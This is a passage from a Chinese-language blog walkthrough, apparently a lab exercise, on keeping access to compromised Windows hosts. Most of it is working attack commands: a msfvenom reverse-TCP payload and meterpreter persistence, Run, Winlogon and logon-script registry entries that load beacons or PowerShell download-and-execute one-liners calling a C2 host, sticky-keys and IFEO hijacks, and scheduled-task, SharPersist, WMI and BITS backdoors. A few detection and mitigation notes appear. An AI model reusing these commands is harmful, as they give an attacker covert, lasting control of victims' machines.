//更改策略位Unrestricted</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019114146666.png" alt="image-20211019114146666"></p><p>Invoke-TokenManipulation.ps1用于打开一个System权限的进程</p><p>2.打开Invoke-TokenManipulation.ps1</p><pre><code>Import-Module C:\Invoke-TokenManipulation.ps1Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019114235483.png" alt="image-20211019114235483"></p><p>可以看到权限是system，这时候再去运行Windows-User-Clone.ps1</p><pre><code>powershell Import-Module C:\Windows-User-Clone.ps1  //去弹出的cmd执行</code></pre><p>导入的时候出现小问题，这个靶机的设定有密码的要求，而且脚本是自动创建一个abc$账户 密码123的，所以需要修改脚本</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019114316700.png" alt="image-20211019114316700"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019114329475.png" alt="image-20211019114329475"></p><p>再次运行，可以看到成功创建了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019114355832.png" alt="image-20211019114355832"></p><h2 id="注册键"><a href="#注册键" class="headerlink" title="注册键"></a>注册键</h2><p>对于注册表来说提不提权都可以，只要是通过后门程序或者攻击脚本的路径添加到注册表的自启动里面去，从而只要目标主机启动就会执行获取到相应的权限。</p><p>一般自启动项是这两个键：<code>Run</code>和<code>RunOnce</code></p><p>区别：</p><p>run：该项下的键值即为开机启动项，每一次随着开机而启动</p><p>runonce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</p><p>注册表的 <strong>HKEY_LOCAL_MACHINE</strong> 和 <strong>HKEY_CURRENT_USER</strong> 键的区别：前者对所有用户有效，后者只对当前用户有效。</p><p>HKEY_LOCAL_MACHINE需要管理员权限才能注册</p><p><strong>HKEY_CURRENT_USER</strong> 不需要管理员权限就可以注册</p><p>1.Run</p><pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RunHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run每次启动后都会按照顺序自动执行</code></pre><p>2.RunOnce </p><pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnceHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></pre><p>比如这边开启一个开机自启动cmd</p><pre><code>c:\windows\system32\cmd.exe</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019125554916.png" alt="image-20211019125554916"></p><p>当我开机后，直接弹出个cmd</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019125855943.png" alt="image-20211019125855943"></p><p>在看别人文章的时候，有很多的方式去维持权限，但是都离不开开机启动</p><p>一般windows的开机菜单里面就放着开机启动</p><pre><code>C:\Users\你的用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019132036323.png" alt="image-20211019132036323"></p><h3 id="run启动后门"><a href="#run启动后门" class="headerlink" title="run启动后门"></a>run启动后门</h3><p>利用</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lport=4444 lhost=192.168.100.129 -f exe -o ash.exe</code></pre><p>利用msf上传木马</p><pre><code>upload ash.exe c:\\windows\\system32</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019143048954.png" alt="image-20211019143048954"></p><p>执行如下命令注册表进行操作制作后门</p><pre><code>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的keyreg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v ash -d 'C:\windows\system32\ash.exe' #设置键值reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v ash   #查看键值</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019143254619.png" alt="image-20211019143254619"></p><p>这里我们已经成功把我们msf生成了木马植入到了注册表的自启动项里面去，我们就需要重新打开一个新的msf监听，并且输</p><pre><code>shutdown -r -t 0  //让目标关机  reboot重启</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019144301268.png" alt="image-20211019144301268"></p><p>开启后成功上线</p><p>cmd执行</p><pre><code>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v ash /t REG_SZ /d "C:\windows\system32\ash.exe"</code></pre><p>powershell</p><pre class="line-numbers language-javascript"><code class="language-javascript">Set<span class="token operator">-</span>ItemProperty <span class="token string">"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" "</span>ash<span class="token string">" "</span>C<span class="token punctuation">:</span>\windows\system32\ash<span class="token punctuation">.</span>exe" <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有一个方法就是拿到meterpreter后以VBS脚本的形式创建一个有效payload，该payload将被上传到目标主机的磁盘上，并创建一个注册表项，该注册表项将在用户登录期间循环运行该有效负载。</p><pre><code>run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r x.x.x.x run persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r x.x.x.x</code></pre><ul><li>-U指定启动方式为用户登录时自启动</li><li>-X指定启动的方式为开机自启动</li><li>-P 指定所使用的payload</li><li>-i不断尝试反向连接的时间间隔，我们这里设置的是5秒钟执行一次</li><li>–r指定攻击者的ip</li><li>-p 指定攻击者监听的端口</li></ul><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019161932942.png" alt="image-20211019161932942"></p><p>可以看到我这这边一直在弹</p><h3 id="winlogon后门"><a href="#winlogon后门" class="headerlink" title="winlogon后门"></a>winlogon后门</h3><p>Winlogon是一个Windows组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在Windows登录期间启动哪些进程，除了用自启动，还有用户登录输入生成后门，当目标运行主机之后，winlogon就会执行后门上线</p><pre><code>HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼UserinitHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit //red add里面写的内容</code></pre><p>还得注意这几个注册表</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ShellHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserinitHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</code></pre><p>userinit与shell主要是来运行exe程序，而notify则用来执行dll文件（Windows 7之前），结合powershell，那么就可以实现cs上线</p><p>执行如下两个命令</p><pre><code>reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /freg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  /v "Userinit" /t REG_SZ /d "C:\Windows\system32\cmd.exe," /f拓展：reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,木马.exe" /freg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\system32\123.exe" /f写入注册键命令如下：reg add "XXXX" /v evil /t REG_SZ /d "[Absolute Path]\xxx.exe"</code></pre><p><code>/ v</code>来指定键名，其中键名debugger是固定的，然后通过<code>/ t</code>来指定REG_SZ（数据类型 REG_SZ型注册表值项没有长度限制）字符串类型，最后通过<code>/ d</code>来指定键的值，/f 不用提示就强行覆盖现有注册表项</p><p>查看效果</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019150113299.png" alt="image-20211019150113299"></p><p>那么思路就是利用cs的powershell上线</p><p>powershell的操作</p><pre><code>ps xxxx &gt;Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name Userinit -value "C:\Windows\system32\userinit.exe,powershell.exe -nop -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://192.168.100.128:80/b`'))`"" 注意反引号，不然会报错</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019150846980.png" alt="image-20211019150846980"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019161013274.png" alt="image-20211019161013274"></p><p>弹了好久，竟然偶然一次成功了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019161151496.png" alt="image-20211019161151496"></p><h3 id="Logon-Scripts后门"><a href="#Logon-Scripts后门" class="headerlink" title="Logon Scripts后门"></a><strong>Logon Scripts后门</strong></h3><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p><p>注册表位置:</p><pre><code>HKEY_CURRENT_USER\Environment</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019162525364.png" alt="image-20211019162525364"></p><p>可以往里面添加，键值就是UserInitMprLogonScript</p><pre><code>reg add HKEY_CURRENT_USER\Environment\ /v UserInitMprLogonScript /t REG_SZ /d "C:\windows\system32\cmd.exe"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019163403701.png" alt="image-20211019163403701"></p><p>同样重启后就会弹出</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019164623781.png" alt="image-20211019164623781"></p><p>同理powershell写入</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set-ItemProperty</span> <span class="token string">"HKCU:\Environment\"</span> <span class="token string">"UserInitMprLogonScript"</span> <span class="token string">"C:\windows\system32\cmd.exe"</span> <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019170019450.png" alt="image-20211019170019450"></p><p>思路就跟上面一样，看大佬用执行bat上线</p><p>写个bat，内容就下面</p><pre><code>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.100.128:80/k'))"</code></pre><p>放到c盘下面，然后写进注册表里面，重启登录就可以上线了</p><p>等待一会上线</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019170833167.png" alt="image-20211019170833167"></p><h3 id="屏幕保护"><a href="#屏幕保护" class="headerlink" title="屏幕保护"></a>屏幕保护</h3><p>对于屏幕保护程序是写在了注册表里面的，而权限仅仅是普通就可以。</p><p>一般来说对于设置过屏保的人那么注册表就会有4个</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020152415604.png" alt="image-20211020152415604"></p><p>而对于未注册过屏保的人那么就只有一个</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020152448939.png" alt="image-20211020152448939"></p><p>完整的路径表</p><pre><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActiveHKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecureHKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOutHKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</code></pre><p>使用方式</p><pre><code>reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\windows\system32\beacon6.exe /freg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /freg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /freg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f</code></pre><p>可以看到已经有了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020152749968.png" alt="image-20211020152749968"></p><p>等待60s</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020155709751.png" alt="image-20211020155709751"></p><h3 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a><strong>文件关联</strong></h3><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。可以利用文件的”打开方式”进行关联选择</p><p>windows下有个assoc命令可以查看和修改文件的扩展名关联。后面就是关联的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019171306852.png" alt="image-20211019171306852"></p><p>ftype命令显示或修改用在文件扩展名关联中的文件类型，跟上面assoc不一样</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019171503897.png" alt="image-20211019171503897"></p><p>可以看到这个文件类型，那么我们就可以修改文件类型去执行我们的后门</p><p>尝试去修改txt的</p><pre><code>\HKEY_CLASS_ROOT\txtfile\shell\open\command的默认值为我们要执行的程序</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019171746707.png" alt="image-20211019171746707"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019172255781.png" alt="image-20211019172255781"></p><p>修改注册表，这个需要管理员的权限</p><pre><code>reg add "HKCR\txtfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "C:\Windows\system32\cmd.exe %1" /f</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019172146998.png" alt="image-20211019172146998"></p><p>然后我们打开1.txt就会出现cmd</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019172502794.png" alt="image-20211019172502794"></p><h2 id="Shift-粘滞键后门（镜像劫持）"><a href="#Shift-粘滞键后门（镜像劫持）" class="headerlink" title="Shift 粘滞键后门（镜像劫持）"></a>Shift 粘滞键后门（镜像劫持）</h2><p>什么是shift粘贴键，有时候打游戏的时候一直狂按shift，会注意弹出这么一个框</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019172821896.png" alt="image-20211019172821896"></p><p>同理在登录界面也会弹出来。</p><p>根据前面维持权限的思路，自然我们可以找到它的路径替换掉它，那么就可以去执行我们自己的后门了</p><p>根据书上的介绍，粘滞键程序名称为“sethc.exe”，其路径为“c:\windows\system32\sethc.exe”</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019173255245.png" alt="image-20211019173255245"></p><p>具体步骤</p><blockquote><p>拿到目标主机权限后，到Windows\system32目录下，将sethc.exe替换成cmd.exe</p><pre><code>move sethc.exe sethc.exe.bak   // 将sethc.exe重命名为bak后缀copy cmd.exe sethc.exe       // 将一个cmd.exe副本保存伪装成sethc.exe</code></pre></blockquote><p>执行命令如下</p><pre><code>move sethc.exe sethc.exe.bak</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019181300392.png" alt="image-20211019181300392"></p><p>但是无法移动，即使是system权限也不行，那么就试一下最高权限TrustedInstaller，找一个进程试TrustedInstaller的，窃取一下</p><p>但是ps了一下没有这个进程，既然没有那么就启动一个服务</p><pre><code>sc.exe start TrustedInstaller</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019181545645.png" alt="image-20211019181545645"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019181647712.png" alt="image-20211019181647712"></p><pre><code>use incognitops      # 找到TrustedInstaller的进程PID，steal_token &lt;PID&gt;      # 从该进程中窃取令牌getuid   //成功窃取TrustedInstaller的令牌后会发现自己的权限仍是NT AUTHORITY\SYSTEM，这是因为TrustedInstaller权限也会显示为NT AUTHORITY\SYSTEM</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019182140831.png" alt="image-20211019182140831"></p><p>进入shell再次移动</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019182207493.png" alt="image-20211019182207493"></p><p>在执行下面命令</p><pre><code>copy cmd.exe sethc.exe</code></pre><p>但是我失败了，在msf上执行失败（这个执行失败是按5下shift没有弹出cmd，还是粘贴键），后来去cs上执行成功了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020103939386.png" alt="image-20211020103939386"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020104032582.png" alt="image-20211020104032582"></p><p>弹出来的还是system权限，那么我们的思路就是可以创建一个角色，添加到管理员里面去</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020104214519.png" alt="image-20211020104214519"></p><p>当然直接修改注册表也可以实现</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exeREG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020105247945.png" alt="image-20211020105247945"></p><p>连续5下就能弹出</p><p>防御的话就是</p><p>如果系统盘为NTFS文件系统，可以将sytem32下的sethc.exe文件设为everyone拒绝访问；</p><p>直接将其删除，最好的方法是在控制面板-辅助功能选项-粘滞键选项，将“使用快捷键”取消即可</p><p>拓展一下其他，方法也是同理</p><pre class="line-numbers language-javascript"><code class="language-javascript">屏幕键盘：C<span class="token punctuation">:</span>\Windows\System32\osk<span class="token punctuation">.</span>exe放大镜：C<span class="token punctuation">:</span>\Windows\System32\Magnify<span class="token punctuation">.</span>exe旁白：C<span class="token punctuation">:</span>\Windows\System32\Narrator<span class="token punctuation">.</span>exe显示切换器 C<span class="token punctuation">:</span>\Windows\System32\DisplaySwitch<span class="token punctuation">.</span>exe应用切换器：C<span class="token punctuation">:</span>\Windows\System32\AtBroker<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了镜像劫持还有映像劫持</p><h3 id="1-IFEO"><a href="#1-IFEO" class="headerlink" title="1.IFEO"></a>1.IFEO</h3><p>所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持</p><p>原理：</p><p>我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020162211676.png" alt="image-20211020162211676"></p><p>可以看到有这么多</p><p>比如劫持一下iexplore.exe  （需要管理员权限）</p><pre class="line-numbers language-javascript"><code class="language-javascript">reg add <span class="token string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe"</span> <span class="token operator">/</span>v <span class="token string">"Debugger"</span> <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"c:\windows\system32\cmd.exe"</span> <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020162528409.png" alt="image-20211020162528409"></p><p>当点开IE浏览器</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020162639978.png" alt="image-20211020162639978"></p><h2 id="windows计划任务"><a href="#windows计划任务" class="headerlink" title="windows计划任务"></a>windows计划任务</h2><p>计划任务可以用过at，schtasks来实现而sc是创建启动服务的。针对这一个方法我们就可以利用后门定时启动我们的木马。</p><p>At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后</p><h3 id="1-at"><a href="#1-at" class="headerlink" title="1.at"></a>1.at</h3><p>at命令是windows自带的用于创建计划任务的命令。它主要工作在Windows Server 2008之前版本的操作系统中。使用at命令在远程目标主机上创建计划任务的流程大致如下：</p><ol><li>使用net time命令确定远程机器当前的系统时间。</li><li>使用copy命令将Payload 文件复制到远程目标机器中。</li><li>使用at命令定时启动该Payload文件。</li><li>删除使用at命令创建计划任务的记录。</li></ol><p>首先需要我们上传后门文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020113314100.png" alt="image-20211020113314100"></p><p>然后查看目标主机的时间</p><pre><code>net time</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020113354615.png" alt="image-20211020113354615"></p><p>定制时间，因为我们要持久的控制，那么必然不能只设置某个时间就上线一次，我们可以设置每个小时，或者每天的固定时间</p><pre><code>at 11:45:00 /every:M,T,W,Th,F,S,Su c:\windows\system32\beacon6.exe</code></pre><p>/every 代表指定日期, M 是星期一, T星期二，以此类推</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020114144883.png" alt="image-20211020114144883"></p><p>等待一段时间。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020114708143.png" alt="image-20211020114708143"></p><p>上线了</p><h3 id="2-schtasks"><a href="#2-schtasks" class="headerlink" title="2.schtasks"></a>2.schtasks</h3><p>在开头已经说了随着windows的版本更替，在vista和2008之后版本已经被抛弃了，随之而来的就是schtasks</p><p>\1. 上传后门。</p><p>\2. 在目标主机DC上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘system32下的beacon6.exe，启动权限为system</p><p>之前做横向的时候schtasks也是一种方法，这里顺便就回顾一下</p><pre><code>schtasks /create /tn backdoor /sc minute /mo 1  /tr c:\windows\system32\beacon6.exe /ru system /f  //在目标主机操作schtasks /create /s x.x.x.x /u 账号 /p 密码 /tn backdoor /sc minute /mo 1 /tr c:\windows\system32\beacon6.exe /ru system /f   //通过ipc连接后使用的，加上/u /s是因为有的时候权限会不够，直接用高权限</code></pre><p>/tn 计划任务名称  </p><p><strong>/SC</strong>：指定运行时间的单位</p><p><strong>/S</strong>： 指定要连接到的远程系统   </p><p><strong>/TR</strong>：要运行程序在远程主机上的全路径</p><p>/ru :指定运行任务的权限</p><p>/mo：指定运行的时间频率，默认为1 就是比如每分钟1次 ，不加这个参数就是默认</p><p>也就是说每分钟就会去执行一次我们的任务</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020115353373.png" alt="image-20211020115353373"></p><p>等待一会查看我们的cs</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020115446717.png" alt="image-20211020115446717"></p><p>可以看到进程名字变成了beacon6.exe</p><h3 id="3-利用SharPersist工具"><a href="#3-利用SharPersist工具" class="headerlink" title="3.利用SharPersist工具"></a>3.利用SharPersist工具</h3><p>地址：<a href="https://github.com/fireeye/SharPersist/releases" target="_blank" rel="noopener">https://github.com/fireeye/SharPersist/releases</a>  详细的指令看github</p><p>这里一篇文章介绍了：<a href="https://www.freebuf.com/sectool/214013.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/214013.html</a></p><p>下载好了上传上去就行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020140949040.png" alt="image-20211020140949040"></p><h4 id="参数-选项"><a href="#参数-选项" class="headerlink" title="参数/选项:"></a>参数/选项:</h4><ul><li><strong>-t</strong> - 持久化技术</li><li><strong>-c</strong> - 要执行的命令</li><li><strong>-a</strong> - 要执行的命令的参数（如果适用）</li><li><strong>-f</strong> - 要创建/修改的文件</li><li><strong>-k</strong> - 要创建/修改的注册表项</li><li><strong>-v</strong> - 要创建/修改的注册表值</li><li><strong>-n</strong> - 计划任务名称或服务名称</li><li><strong>-m</strong> - 方法（添加、删除、检查、列出）</li><li><strong>-o</strong> - 可选的附加组件</li><li><strong>-h</strong> - 帮助页面</li></ul><p>持久化 (-t)</p><ul><li><code>keepass</code> - 后门keepass配置文件</li><li><code>reg</code> - 注册表项添加/修改</li><li><code>schtaskbackdoor</code> - 通过向其添加附加操作来后门计划任务</li><li><code>startupfolder</code> - 启动文件夹中的lnk文件</li><li><code>tortoisesvn</code> - 乌龟 svn 钩子脚本</li><li><code>service</code> - 创建新的窗口服务</li><li><code>schtask</code> - 创建新的计划任务</li></ul><p>方法 (-m)</p><ul><li><code>add</code> - 添加持久化技术</li><li><code>remove</code> - 移除持久化技术</li><li><code>check</code> - 执行持久性技术的试运行</li><li><code>list</code> - 列出持久性技术的当前条目</li></ul><p>可选附加组件 (-o)</p><ul><li><code>env</code> - 用于注册表的 env 变量混淆的可选附加组件</li><li><code>hourly</code> - schtask 频率的可选插件</li><li><code>daily</code> - schtask 频率的可选插件</li><li><code>logon</code> - schtask 频率的可选插件</li></ul><p>注册表项 (-k)</p><ul><li><code>hklmrun</code></li><li><code>hklmrunonce</code></li><li><code>hklmrunonceex</code></li><li><code>hkcurun</code></li><li><code>hkcurunonce</code></li><li><code>logonscript</code></li><li><code>stickynotes</code></li><li><code>userinit</code></li></ul><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>#### </p><p>当我们想要执行</p><pre><code>SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Administrator\beacon6.exe" -n "beacon6" -m add -o logon</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020143615302.png" alt="image-20211020143615302"></p><p>当用户重启后就会收到上线</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020143605001.png" alt="image-20211020143605001"></p><p>附带几个</p><h2 id="WMI-后门"><a href="#WMI-后门" class="headerlink" title="WMI 后门"></a>WMI 后门</h2><p>WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装， 因为WMI是Windows系统自带功能。而且整个运行过程都在计算机内存中发生，不会留下任何痕迹。</p><p>也就是说对于wmi后门是一个无进程无文件的形式，原理：把代码加密放到WMI中，实现了无文件，当条件满足，就会实现powershell去执行后门，当执行完了就会删除。</p><p>工具有很多，都能去执行Empire、SharpSploit、PoshC2、PowerLurk、WMIPersist</p><p>就是这个模块persistence/elevated/wmi</p><pre><code>usemodule persistence/elevated/wmiset Listener xxxexecute</code></pre><p>检测是否存在wmi后门</p><pre><code>Get-WmiObject -Namespace root\Subscription -Class CommandLineEventConsumer -FILTER "Name='Updater'"</code></pre><p>这个empire出了点问题，先放一下</p><h2 id="后台智能传输服务（BITS）"><a href="#后台智能传输服务（BITS）" class="headerlink" title="后台智能传输服务（BITS）"></a>后台智能传输服务（BITS）</h2><p>Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</p><p>网上的“渗透教程”中有很多利用bitsadmin命令下载文件或执行命令的操作，但它其实也可以用来做权限维持，并且可以绕过Autoruns的检测以及杀软的自启命令执行保护</p><pre><code>bitsadmin /create evilbitsadmin /addfile evil "c:\windows\system32\beacon6.exe" "c:\windows\system32\beacon6.exe"bitsadmin.exe /SetNotifyCmdLine evil "c:\windows\system32\beacon6.exe" NULbitsadmin /Resume evil</code></pre><p>执行完</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020160539876.png" alt="image-20211020160539876"></p><p>重新启动后等待一会又重新获得</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020161018025.png" alt="image-20211020161018025"></p><p>而后台智能传输服务的默认时间是90天。</p><p>唯一检测方式是通过bistamin命令：</p><pre><code> bitsadmin /list /allusers /verbose</code></pre><h2 id="msdtc加载后门"><a href="#msdtc加载后门" class="headerlink" title="msdtc加载后门"></a>msdtc加载后门</h2><p>msdtc.exe 存在于组环境和域环境中,是微软的一个分布式事物处理协调器服务。要求处于工作组或者域环境内</p><p>该服务启动后会尝试从System32加载三个DLL文件：<strong>oci.dll、SQLLib80.dll、xa80.dll</strong></p><p><img src="/images/loading.gif" 